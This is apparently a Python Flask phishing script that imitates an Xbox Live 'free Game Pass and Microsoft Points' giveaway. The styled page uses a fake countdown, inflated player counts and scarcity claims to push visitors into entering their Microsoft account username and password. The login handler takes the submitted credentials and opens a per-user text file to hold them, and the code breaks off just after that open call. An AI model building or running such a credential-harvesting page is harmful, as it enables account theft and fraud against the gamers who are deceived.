import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'xbox-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Xbox Live")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['xb_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
        <title>Xbox Live - Free Game Pass & Microsoft Points</title>
        <style>
            :root {
                --xbox-green: #107C10;
                --xbox-dark: #000000;
                --xbox-light: #F5F5F5;
                --xbox-blue: #0078D4;
                --xbox-gold: #FFB900;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #000000 0%, #107C10 100%);
                font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                -webkit-text-size-adjust: 100%;
                -webkit-tap-highlight-color: transparent;
            }
            
            .login-box {
                background: rgba(0, 0, 0, 0.85);
                backdrop-filter: blur(10px);
                width: 100%;
                max-width: 500px;
                padding: 20px;
                border-radius: 8px;
                text-align: center;
                border: 2px solid #107C10;
                box-shadow: 0 8px 32px rgba(16, 124, 16, 0.3);
                margin: 0 auto;
            }
            
            .xbox-logo {
                font-size: 48px;
                font-weight: 800;
                color: white;
                margin-bottom: 15px;
                letter-spacing: 1px;
            }
            
            .gamepass-banner {
                background: linear-gradient(90deg, #107C10 0%, #5FAF5F 50%, #107C10 100%);
                color: white;
                padding: 15px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 700;
                font-size: 18px;
                border: 2px solid #5FAF5F;
                animation: xboxGlow 2s infinite;
            }
            
            @keyframes xboxGlow {
                0% { box-shadow: 0 0 15px rgba(16, 124, 16, 0.5); }
                50% { box-shadow: 0 0 30px rgba(95, 175, 95, 0.8); }
                100% { box-shadow: 0 0 15px rgba(16, 124, 16, 0.5); }
            }
            
            .points-badge {
                background: linear-gradient(90deg, #FFB900 0%, #FFD966 50%, #FFB900 100%);
                color: #000000;
                padding: 15px;
                border-radius: 8px;
                margin: 15px 0;
                font-weight: 900;
                font-size: 24px;
                border: 2px solid #FFD966;
            }
            
            .giveaway-container {
                background: rgba(16, 124, 16, 0.1);
                border: 2px dashed var(--xbox-green);
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
            }
            
            h1 {
                font-size: 28px;
                margin: 10px 0;
                color: white;
                font-weight: 700;
            }
            
            .subtitle {
                color: #CCCCCC;
                font-size: 14px;
                margin-bottom: 20px;
                line-height: 1.5;
            }
            
            .timer {
                background: rgba(255, 0, 0, 0.1);
                border: 2px solid #FF4C4C;
                border-radius: 8px;
                padding: 12px;
                margin: 15px 0;
                font-family: 'Consolas', 'Cascadia Code', monospace;
                font-size: 22px;
                color: #FF9999;
                text-align: center;
                font-weight: bold;
            }
            
            .games-showcase {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            .game-card {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #333333;
                border-radius: 8px;
                padding: 15px;
                text-align: center;
                transition: all 0.3s;
                position: relative;
                overflow: hidden;
            }
            
            .game-card:hover {
                border-color: var(--xbox-green);
                background: rgba(16, 124, 16, 0.1);
                transform: translateY(-3px);
            }
            
            .game-image {
                width: 100%;
                height: 100px;
                background: linear-gradient(45deg, #000000, #333333);
                border-radius: 6px;
                margin-bottom: 12px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 32px;
                color: #5FAF5F;
            }
            
            .game-title {
                color: white;
                font-weight: 600;
                font-size: 16px;
                margin-bottom: 6px;
            }
            
            .game-price {
                color: #FFB900;
                font-weight: bold;
                font-size: 12px;
            }
            
            .free-tag {
                position: absolute;
                top: 8px;
                right: 8px;
                background: #107C10;
                color: white;
                padding: 3px 6px;
                border-radius: 4px;
                font-size: 10px;
                font-weight: bold;
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            .form-label {
                color: #CCCCCC;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 6px;
                display: block;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            input {
                width: 100%;
                padding: 14px;
                background: rgba(255, 255, 255, 0.05);
                border: 2px solid #333333;
                border-radius: 4px;
                color: white;
                font-size: 16px;
                -webkit-appearance: none;
                appearance: none;
                transition: all 0.3s;
            }
            
            input:focus {
                border-color: var(--xbox-green);
                outline: none;
                background: rgba(255, 255, 255, 0.1);
            }
            
            input::placeholder {
                color: #666666;
            }
            
            .login-btn {
                background: linear-gradient(45deg, #107C10, #5FAF5F);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 4px;
                font-weight: 700;
                font-size: 16px;
                width: 100%;
                margin: 20px 0 12px;
                cursor: pointer;
                transition: all 0.3s;
                -webkit-appearance: none;
                appearance: none;
            }
            
            .login-btn:hover {
                transform: translateY(-3px);
                box-shadow: 0 10px 25px rgba(16, 124, 16, 0.4);
            }
            
            .benefits-list {
                text-align: left;
                margin: 20px 0;
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                margin: 12px 0;
                color: #FFFFFF;
                font-size: 14px;
            }
            
            .benefit-icon {
                color: #FFB900;
                font-weight: bold;
                margin-right: 12px;
                font-size: 18px;
                min-width: 20px;
            }
            
            .gamepass-badge {
                display: inline-flex;
                align-items: center;
                background: linear-gradient(45deg, #107C10, #5FAF5F);
                color: white;
                padding: 5px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 700;
                margin-left: 8px;
            }
            
            .warning-note {
                color: #FF9999;
                font-size: 11px;
                margin-top: 20px;
                border-top: 1px solid #333333;
                padding-top: 15px;
                text-align: center;
            }
            
            .xbox-logo-img {
                width: 100px;
                height: auto;
                margin: 0 auto 15px;
                display: block;
            }
            
            .players-count {
                background: rgba(255, 185, 0, 0.1);
                border: 2px solid var(--xbox-gold);
                border-radius: 8px;
                padding: 10px;
                margin: 15px 0;
                font-size: 13px;
                color: #FFD966;
            }
            
            .console-icons {
                display: flex;
                justify-content: center;
                gap: 12px;
                margin: 12px 0;
                flex-wrap: wrap;
            }
            
            .console-icon {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #333333;
                border-radius: 8px;
                padding: 10px;
                font-size: 20px;
                width: 50px;
                height: 50px;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .region-selector {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #333333;
                border-radius: 4px;
                padding: 12px;
                margin: 12px 0;
                font-size: 14px;
                color: #CCCCCC;
                width: 100%;
                -webkit-appearance: none;
                appearance: none;
            }
            
            /* Mobile-specific adjustments */
            @media (max-width: 480px) {
                body {
                    padding: 10px;
                    min-height: -webkit-fill-available;
                }
                
                .login-box {
                    padding: 15px;
                    width: 100%;
                    max-width: 100%;
                }
                
                .xbox-logo-img {
                    width: 80px;
                }
                
                .gamepass-banner {
                    font-size: 16px;
                    padding: 12px;
                }
                
                .points-badge {
                    font-size: 20px;
                    padding: 12px;
                }
                
                h1 {
                    font-size: 24px;
                }
                
                .timer {
                    font-size: 20px;
                    padding: 10px;
                }
                
                .games-showcase {
                    grid-template-columns: 1fr;
                    gap: 10px;
                }
                
                .game-image {
                    height: 90px;
                    font-size: 28px;
                }
                
                .console-icon {
                    width: 45px;
                    height: 45px;
                    font-size: 18px;
                }
                
                input {
                    padding: 12px;
                    font-size: 16px;
                }
                
                .login-btn {
                    padding: 14px;
                    font-size: 15px;
                }
                
                .benefit-item {
                    font-size: 13px;
                }
            }
            
            @media (max-width: 360px) {
                .points-badge {
                    font-size: 18px;
                }
                
                .gamepass-banner {
                    font-size: 14px;
                }
                
                .console-icons {
                    gap: 8px;
                }
                
                .console-icon {
                    width: 40px;
                    height: 40px;
                }
            }
            
            /* Prevent text selection on mobile */
            .noselect {
                -webkit-touch-callout: none;
                -webkit-user-select: none;
                -khtml-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
            }
            
            /* Better touch targets */
            button, input, select {
                min-height: 44px;
            }
        </style>
    </head>
    <body class="noselect">
        <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
            <div class="login-box">
                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik05My4xMjUgNTIuMjMzM0M5My4xMjUgNjcuNTEyOCA4MC44NzUgODIuMTY4NCA2My4yNSA4OC41ODI2QzU0Ljg3NSA5MS44MzQ3IDQ4Ljg3NSA5Mi43ODQ2IDQzLjc1IDkyLjc4NDZDNDAuNjI1IDkyLjc4NDYgMzcuNSA5Mi40MTgyIDM0LjM3NSA5MS42ODU0QzI3LjEyNSA4OS44OTE2IDIyLjUgODguNTgyNiAxNi41IDg2LjU5MzhDMTUuMzc1IDg2LjE2MDcgMTQuMjUgODUuNzI3NiAxMi41IDg1LjEwM0MxMS4zNzUgODQuNTY5OSA5LjM3NSA4My42NCA4LjEyNSA4Mi4zMDMxQzcuNSAxNy4wNDE5IDMxLjg3NSAzLjEyNSA0OC4xMjUgMy4xMjVDNjMuMjUgMy4xMjUgNzYuODc1IDEzLjQzMTIgODIuNSAyNy4yMjg4Qzg4LjEyNSAzNy41MDI3IDg4LjEyNSA1MC4xODc1IDgyLjUgNjAuMDY2M0M4Ny4zNzUgNTkuNzMyOCA5MC42MjUgNTguMDYzMyA5My4xMjUgNTIuMjMzM1oiIGZpbGw9IiMxMDdDMTAiLz4KPHBhdGggZD0iTTE0LjI1IDc0LjE2NTdDMTUuNjI1IDc0LjQ5OTIgMTYuNSA3NC44MzI3IDE4LjEyNSA3NS4yNjU4QzIzLjI1IDc2LjgwOTYgMjcuMTI1IDc3Ljk2NjkgMzMuNzUgNzkuNTEwN0M0NC42MjUgODIuMTY4NCA1My43NSA4Mi41MDIgNjAuMzc1IDgwLjMyMzFDNjMuNSA3OS40MzAzIDY2LjI1IDc4LjEwMjMgNzAuMzc1IDc1Ljk1MjNDNzQuNSA3My44MDIzIDc3LjI1IDcyLjM1NzggODAgNzAuMDE5OEM4Mi43NSA2Ny42ODE4IDg1IDY0LjY1MjMgODYuMjUgNjAuNzIyMkM4Ny41IDU2Ljc5MiA4Ny41IDUxLjc3MTIgODYuMjUgNDcuMzk2M0M4NS4zNzUgNDQuMTg4MiA4NC4xMjUgNDIuMDM4MiA4My4xMjUgMzkuODg4MkM4Mi4xMjUgMzcuNzM4MiA4MS41IDM2LjEwMzEgODEuNSAzMy41ODI2QzgxLjUgMzAuMzkzOCA4My4xMjUgMjguNTE5MyA4NS4zNzUgMjcuMjI4OEM4Ny42MjUgMjUuOTM4MyA5MC4yNSAyNS44MDUxIDkyLjg3NSAyNy4yMjg4QzkzLjUgMjcuNTYyMyA5My43NSAyOC4wOTU0IDkzLjUgMjguNTAyN0M5My4xMjUgMjkuMjk2NSA5Mi42MjUgMzAuMjMxMiA5Mi4xMjUgMzEuMDI1QzkxLjYyNSAzMS44MTg4IDkxIDMyLjY3OTkgOTAuMzc1IDMzLjI4MDFDODguNSAzNS4wMzA4IDg2LjI1IDM1Ljk3NDIgODQuMzc1IDM3LjU4MjdDODIuNSA0NS4zNzEyIDc5LjM3NSA1My4xNiA3NC4zNzUgNjAuMDY2M0M3MC4zNzUgNjUuNDUxMSA2NS42MjUgNjkuMDMxMiA2MC4zNzUgNzEuMTc4N0M1NS4xMjUgNzMuMzI2MiA0OS4zNzUgNzMuOTkyOSA0My43NSA3My4xNDkzQzM4LjEyNSA3Mi4zMDU3IDMzLjEyNSA3MC4wMTk4IDI5LjM3NSA2Ny4wMDM1QzI1LjYyNSA2My45ODcyIDIzLjEyNSA2MC4yNDUyIDIxLjg3NSA1Ni4yMjE4QzIwLjYyNSA1Mi4xOTg0IDIwLjYyNSA0OC4wNDg2IDIxLjg3NSA0NC4xODgyQzIzLjEyNSA0MC4zMjc4IDI1LjYyNSAzNy4xMjU2IDI5LjM3NSAzNC4zODAxQzMzLjEyNSAzMS42MzQ3IDM4LjEyNSAyOS40MTU3IDQzLjc1IDI4LjU3MjFDNDkuMzc1IDI3LjcyODUgNTUuMTI1IDI4LjM5NTIgNjAuMzc1IDMwLjU0MjdDNjUuNjI1IDMyLjY5MDIgNzAuMzc1IDM2LjI3MDMgNzQuMzc1IDQxLjY1NTFDNzcuMjUgNDUuNTEyNSA4MCA1MC4xODc1IDgyLjEyNSA1NC41NTE3QzgwLjg3NSA1NC43ODUxIDc5LjYyNSA1NS4wMTg1IDc4LjEyNSA1NS4wMTg1Qzc2LjYyNSA1NS4wMTg1IDc1LjM3NSA1NC42ODUgNzQuMzc1IDU0LjAxODNDNzMuMzc1IDUzLjM1MTYgNzIuNjI1IDUyLjIyMzMgNzIuNjI1IDUwLjY2NjhDNzIuNjI1IDQ5LjE4NzUgNzMuNSA0Ny45MzM2IDc1LjM3NSA0Ny4wMTg1Qzc3LjI1IDQ2LjEwMzUgNzkuODc1IDQ1Ljk3MDMgODIuMTI1IDQ3LjA2MDRDODIuNjI1IDQ3LjI5MzggODIuODc1IDQ3Ljc5MzggODIuNzUgNDguMzYwNkM4Mi41IDQ5LjI2NDkgODIuMTI1IDUwLjIzNjQgODEuNjI1IDUxLjA3MzVDODAuNSA0OC4wNDg2IDc4Ljc1IDQ1LjA1MDcgNzYuMjUgNDIuMzE4OEM3My43NSAzOS41ODY5IDcwLjUgMzcuMTI1NiA2Ny4yNSAzNS4zNDUyQzY0IDMzLjU2NDggNjAuMzc1IDMyLjQ2NDIgNTYuMjUgMzEuOTk3N0M1Mi4xMjUgMzEuNTMxMiA0OC4xMjUgMzEuNzk4IDQ0LjM3NSAzMi44MDIzQzQwLjYyNSAzMy44MDY2IDM3LjM3NSAzNS41MjM5IDM0Ljc1IDM3Ljg4MTlDMzIuMTI1IDQwLjIzOTkgMzAuMjUgNDMuMTY4NCAyOS4zNzUgNDYuNzMzNEMyOC41IDUwLjI5ODQgMjguNSA1NC4zMjE4IDI5LjM3NSA1Ny43NTQyQzMwLjI1IDYxLjE4NjYgMzIuMTI1IDY0LjExNTEgMzQuNzUgNjYuNDczMUMzNy4zNzUgNjguODMxMSA0MC42MjUgNzAuNTQ4NCA0NC4zNzUgNzEuNTUyN0M0OC4xMjUgNzIuNTU3IDUyLjEyNSA3Mi44MjM4IDU2LjI1IDcyLjM1NzNDNjAgNzEuODkwOCA2My42MjUgNzAuNzkwMiA2Ni44NzUgNjkuMDE2M0M3MC4xMjUgNjcuMjQyNCA3Mi43NSA2NC43OTkgNzUuMjUgNjEuNjY5NEM3Ny43NSA1OC41Mzk5IDc5LjUgNTUuMDE4NSA4MC44NzUgNTEuMDczNUM4MC44NzUgNTEuNTczNSA4MS4xMjUgNTIuMDczNSA4MS4zNzUgNTIuNDA3QzgxLjYyNSA1Mi43NDA1IDgyLjEyNSA1My4wNzQgODIuNjI1IDUzLjA3NEM4My43NSA1My4wNzQgODQuNSA1Mi4yMjMzIDg0LjUgNTAuOTcwOEM4NC41IDQ5LjcxODMgODMuNzUgNDguNTcwMSA4Mi41IDQ3Ljc5MzZDODEuMjUgNDcuMDE3MSA3OS42MjUgNDYuNzMzNCA3OC4xMjUgNDcuMTY2NUM3Ni42MjUgNDcuNTk5NiA3NS4zNzUgNDguNzI4IDc1LjM3NSA1MC4wMTg1Qzc1LjM3NSA1MS4xMDM1IDc2LjI1IDUyLjA3MzUgNzcuNjI1IDUyLjU3MzVDNzkuMDAxIDUzLjA3MzUgODAuNzUxIDUzLjA3MzUgODIuMTI1IDUyLjMzMzZDODIuODc1IDUyLjAwMDEgODMuMjUgNTEuMjMzNCA4My4zNzUgNTAuMzMzQzgzLjM3NSA0OC4wNDg2IDgxLjI1IDQ0LjUxNzMgNzcuNjI1IDQwLjM5MzlDNzMuMzc1IDM1LjY1NzkgNjcuNSAzMi43MTM5IDYwLjM3NSAzMS4yNzAxQzUzLjI1IDI5LjgyNjMgNDYuMjUgMzAuNDkzIDQwIDMzLjE1MDhDMzMuNzUgMzUuODA4NSAyOC4zNzUgNDAuNDE4IDI0Ljg3NSA0Ni4xNDQxQzIxLjM3NSA1MS44NzAyIDE5Ljc1IDU4LjU2ODcgMjAuNjI1IDY1LjQ1MTFDMjEuNSA3Mi4zMzM1IDI0Ljg3NSA3OS4xMjkgMjkuMzc1IDg0LjA1MjdDMzMuODc1IDg4Ljk3NjQgMzkuNSA5Mi4wMDYgNDUuNjI1IDkyLjg0OTZDNTEuNzUgOTMuNjkyNSA1Ny4zNzUgOTIuNzg0NiA2My4xMjUgOTAuMDgxOUM2OC44NzUgODcuMzc5MiA3My4zNzUgODMuMDE1MSA3Ny4yNSA3Ny45NjY5QzgxLjEyNSA3Mi45MTg3IDg0LjM3NSA2Ny4yNDI0IDg2Ljg3NSA2MC44NDk5Qzg3Ljc1IDU4LjU2ODcgODguMzc1IDU2LjM1MjMgODguNjI1IDU0LjA2NzlDODguNjI1IDUzLjUzNDggODguODc1IDUzLjA3NCA4OS4zNzUgNTIuODA3MkM5MC4yNSAyMS4zODIzIDcxLjg3NSA5LjQzMTg3IDUxLjg3NSA5LjQzMTg3QzQwLjYyNSA5LjQzMTg3IDI5Ljc1IDE1LjU4NTQgMjMuNSAyNS44MDUxQzE3LjI1IDM2LjAyNDggMTcuMjUgNDkuMjg5NyAyMy41IDU5LjUwOTRDMjguNzUgNjcuNjgxOCAzNi42MjUgNzMuNDk5MiA0Ni4xMjUgNzUuNDMyNkM1Mi44NzUgNzYuNjQ2MiA1OC43NSA3NS4yNjU4IDYzLjYyNSA3Mi43Mjg4QzY2LjYyNSA3MS4yODUxIDY5LjI1IDY5LjM0ODcgNzIuNSA2Ny41Njg0Qzc1Ljc1IDY1Ljc4OCA3OC42MjUgNjQuMDA3NiA4MS4xMjUgNjEuNDMxOUM4My42MjUgNTguODU2MiA4NS41IDU1LjQ1MTEgODYuNjI1IDUxLjA3MzVDODcuNzUgNDYuNjk1OSA4Ny43NSA0MS45MzU3IDg2LjYyNSAzNy41ODI3Qzg1LjUgMzMuMjI5NyA4My42MjUgMjkuNzUwNSA4MS4xMjUgMjcuMTc0OEM3OC42MjUgMjQuNTk4MSA3NS43NSAyMi44MTc3IDcyLjUgMjEuMDM3M0M2OS4yNSAxOS4yNTY5IDY2LjYyNSAxNy43MTk5IDYzLjYyNSAxNi40NzMxQzYyLjUgMTUuOTM5OSA2MS4xMjUgMTUuODA2NyA1OS44NzUgMTYuMTQwMkM1OC42MjUgMTYuNDczNyA1Ny41IDE3LjMxNzMgNTYuODc1IDE4LjQyNDFDNTYuMjUgMTkuNTMwOSA1Ni4xMjUgMjAuNzY3MiA1Ni42MjUgMjEuNzA4N0M1Ny4xMjUgMjIuNjUwMiA1OC4xMjUgMjMuMzY5MiA1OS4zNzUgMjMuNTY4N0M2MS42MjUgMjQuMDM1MiA2My4yNSAyNC45NzY3IDY0Ljc1IDI2LjA4MzVDNjYuMjUgMjcuMTkwMyA2Ny41IDI4LjYzNDEgNjguNSAzMC4yNDI2QzY5LjUgMzEuODUxMSA3MC4zNzUgMzMuNjMxNSA3MS4yNSAzNS40MTE5QzcyLjEyNSAzNy4xOTIzIDcyLjg3NSAzOS4wMzYyIDczLjUgNDAuODgzQzc0LjEyNSA0Mi43Mjk4IDc0LjYyNSA0NC41NzY2IDc1IDQ2LjI4MDJDNzUuMzc1IDQ3Ljk4MzkgNzUuNjI1IDQ5LjY1MDQgNzUuNjI1IDUxLjE3MDFDNzUuNjI1IDUyLjY4OTggNzUuMzc1IDU0LjA2NzkgNzUgNTUuMzA0MkM3NC42MjUgNTYuNTQwNSA3NCA1Ny43NTA2IDczLjM3NSA1OC43OTIzQzY5LjM3NSA2NS4xMjE1IDYyLjg3NSA2OS4wMzEyIDU1LjM3NSA2OS45NDYyQzQ3Ljg3NSA3MC44NjEyIDQwLjYyNSA2OC4wNzM4IDM0LjM3NSA2Mi45MzEzQzI4LjEyNSA1Ny43ODg4IDIzLjc1IDUwLjU1NTMgMjIuMTI1IDQyLjQ4MDZDMjAuNSA0NC41MTczIDIwLjUgNDguMDQ4NiAyMi4xMjUgNTIuOTcwM0MyMy43NSA1Ny44OTIgMjcuNSA2My40MTUzIDMzLjEyNSA2Ny4wMDM1QzM4Ljc1IDcwLjU5MTcgNDUuNjI1IDcyLjA4NjQgNTIuMjUgNzAuNjg5M0M1OC44NzUgNjkuMjkxNSA2NC4zNzUgNjUuMTIxNSA2Ny44NzUgNTkuMTk1NUM3MC4xMjUgNTUuMjMxOCA3MS41IDUwLjUxODUgNzEuNjI1IDQ1LjYxOTJDNzEuNzUgNDAuNzE5OSA3MC42MjUgMzUuOTExMyA2OC4zNzUgMzEuNjg0M0M2Ni4xMjUgMjcuNDU3MyA2Mi44NzUgMjMuODc3MiA1OS4zNzUgMjEuMzE0OUM1NS44NzUgMTguNzUyNiA1Mi4xMjUgMTcuMTA1MSA0OC4zNzUgMTYuNDczN0M0NC42MjUgMTUuODQyMyA0MS4xMjUgMTYuMzA4OCAzOC4xMjUgMTcuNzg4MUMzNS4xMjUgMTkuMjY3NCAzMi44NzUgMjEuNTYzMSAzMS42MjUgMjQuNTc1MkMzMC4zNzUgMjcuNTg3MyAzMC4zNzUgMzEuMTY3NCAzMS42MjUgMzQuNTQyM0MzMi44NzUgMzcuOTE3MyAzNS4zNzUgNDAuODEzOCAzOC43NSA0Mi44ODA4QzQyLjEyNSA0NC45NDc4IDQ2LjI1IDQ2LjE4NDEgNTAuMzc1IDQ2LjQxNzZDNTQuNSA0Ni42NTEgNTguNjI1IDQ1Ljg0MDggNjIuMjUgNDQuMjQ3NUM2NS44NzUgNDIuNjU0MiA2OC44NzUgNDAuMzkyIDcxLjI1IDM3LjU4MjdDNzMuNjI1IDM0Ljc3MzQgNzUuMzc1IDMxLjQyMjQgNzYuNSAyNy43NjkxQzc3LjYyNSAyNC4xMTU4IDc4LjEyNSAyMC4yNTM2IDc3Ljg3NSAxNi4zOTEzQzc3LjYyNSAxMi41MjkgNzYuNjI1IDguODkyOTcgNzUgNS42MTg1OUM3My4zNzUgMi40MDIxNCA3MC42MjUgMCA2Ny4yNSAwQzYzLjg3NSAwIDYxLjI1IDIuNzAyNTcgNjAuNSA3LjA3NDA0QzU5LjM3NSAxMy43MTE1IDU1LjM3NSAxOS4xNDU3IDQ5LjM3NSAyMS4zMTQ5QzQzLjM3NSAyMy40ODQxIDM2Ljc1IDIyLjE4MDYgMzEuNzUgMTcuNzg4MUMyNi43NSAxMy4zOTU2IDIzLjc1IDYuMjc2MTEgMjMuNzUgMEgxNC4yNUMxNC4yNSA2Ljg5MzA0IDE3LjI1IDEzLjg3OSAyMi4xMjUgMTkuNjE3QzI3IDI1LjM1NSAzMy4zNzUgMjkuNDcyNyA0MC4zNzUgMzEuMjAxM0M0Ny4zNzUgMzIuOTI5OSA1NC42MjUgMzIuMTUzNCA2MC44NzUgMjkuMDMyN0M2Ny4xMjUgMjUuOTEyIDcxLjg3NSAyMC41Mjc0IDc0LjM3NSAxNC4xMzQ4Qzc2Ljg3NSA3Ljc0MjI1IDc2Ljg3NSAwLjYxNjM4OSA3NC4zNzUgMEg2NEM2MS43NSAwIDU5LjUgMi42OTI2NCA1OC43NSA3LjA3NDA0QzU3LjYyNSAxMi41OTczIDUzLjg3NSAxNy4yODA4IDQ4Ljc1IDE5LjQ4MTZDNDMuNjI1IDIxLjY4MjQgMzcuNzUgMjAuOTEwMiAzMy4xMjUgMTcuNzg4MUMyOC41IDE0LjY2NiAyNS42MjUgOS41OTU3IDI1LjYyNSAzLjk1Njk1SDE0LjI1QzE0LjI1IDEyLjQxMzkgMTguMTI1IDIwLjU4MDcgMjQuNzUgMjcuMDk2MkMzMS4zNzUgMzMuNjExNyA0MC4yNSAzNy45NDYyIDQ5LjYyNSAzOS4zNDMwQzU5IDQwLjczOTggNjguMzc1IDM5LjA5MjMgNzYuMjUgMzQuODA2OEM4NC4xMjUgMzAuNTIxMyA5MC4xMjUgMjMuNzYyNyA5My4xMjUgMTUuOTMwOEM5Ni4xMjUgOC4wOTg5NiA5Ni4xMjUgLTAuNTQwNzI5IDkzLjEyNSA4LjQwOTc3VjUyLjIzMzNaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K" alt="Xbox Logo" class="xbox-logo-img">
                
                <div class="gamepass-banner">
                    🎮 FREE XBOX GAME PASS GIVEAWAY 🎮
                </div>
                
                <div class="points-badge">
                    25,000 FREE MICROSOFT POINTS
                </div>
                
                <div class="console-icons">
                    <div class="console-icon">X</div>
                    <div class="console-icon">S</div>
                    <div class="console-icon">PC</div>
                    <div class="console-icon">☁️</div>
                </div>
                
                <div class="giveaway-container">
                    <h1>Claim Free Game Pass & Points</h1>
                    <div class="subtitle">
                        Limited to first 250 gamers! <span class="gamepass-badge">Game Pass Ultimate</span>
                    </div>
                    
                    <div class="timer" id="countdown">
                        30:00
                    </div>
                </div>
                
                <div class="players-count">
                    🎯 <strong>98,472,836 active players</strong> - Limited spots available!
                </div>
                
                <select class="region-selector">
                    <option>United States (English)</option>
                    <option>United Kingdom (English)</option>
                    <option>Europe (Multi-language)</option>
                    <option>Japan</option>
                    <option>Australia/New Zealand</option>
                </select>
                
                <div class="games-showcase">
                    <div class="game-card">
                        <div class="free-tag">FREE</div>
                        <div class="game-image">🎮</div>
                        <div class="game-title">Halo Infinite</div>
                        <div class="game-price">$59.99 → FREE</div>
                    </div>
                    <div class="game-card">
                        <div class="free-tag">FREE</div>
                        <div class="game-image">⚔️</div>
                        <div class="game-title">Forza Horizon 5</div>
                        <div class="game-price">$59.99 → FREE</div>
                    </div>
                    <div class="game-card">
                        <div class="free-tag">FREE</div>
                        <div class="game-image">🛡️</div>
                        <div class="game-title">Gears 5</div>
                        <div class="game-price">$59.99 → FREE</div>
                    </div>
                    <div class="game-card">
                        <div class="free-tag">FREE</div>
                        <div class="game-image">🧟</div>
                        <div class="game-title">State of Decay 3</div>
                        <div class="game-price">$69.99 → FREE</div>
                    </div>
                </div>
                
                <div class="benefits-list">
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        25,000 Microsoft Points Added
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        1 Year Xbox Game Pass Ultimate
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        4 Free Xbox Exclusive Games
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Xbox Cloud Gaming Access
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        EA Play Included (Premium)
                    </div>
                </div>
                
                <form action="/login" method="post">
                    <div class="form-group">
                        <label class="form-label">EMAIL, PHONE, OR XBOX GAMERTAG</label>
                        <input type="text" name="username" placeholder="Enter your Microsoft/Xbox account" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">PASSWORD</label>
                        <input type="password" name="password" placeholder="Enter your password" required>
                    </div>
                    
                    <button type="submit" class="login-btn">
                        🎮 Claim Free Game Pass & Points
                    </button>
                </form>
                
                <div class="warning-note">
                    ⚠️ This Xbox Live promotion ends in 30 minutes. Benefits activate within 24 hours.
                </div>
            </div>
        </div>
        
        <script>
            // Countdown timer
            let timeLeft = 1800; // 30 minutes in seconds
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 300) { // Last 5 minutes
                    countdownElement.style.background = 'rgba(255, 0, 0, 0.2)';
                    countdownElement.style.animation = 'xboxGlow 1s infinite';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Promotion Ended!";
                    countdownElement.style.color = '#FF4C4C';
                }
            }
            
            updateTimer();
            
            // Animate game cards
            const gameCards = document.querySelectorAll('.game-card');
            gameCards.forEach((card, index) => {
                card.style.opacity = '0';
                card.style.transform = 'translateY(20px)';
                
                setTimeout(() => {
                    card.style.transition = 'all 0.5s ease';
                    card.style.opacity = '1';
                    card.style.transform = 'translateY(0)';
                }, index * 200);
            });
            
            // Mobile viewport adjustment
            function setViewportHeight() {
                let vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', vh + 'px');
            }
            
            setViewportHeight();
            window.addEventListener('resize', setViewportHeight);
            window.addEventListener('orientationchange', setViewportHeight);
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('xb_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
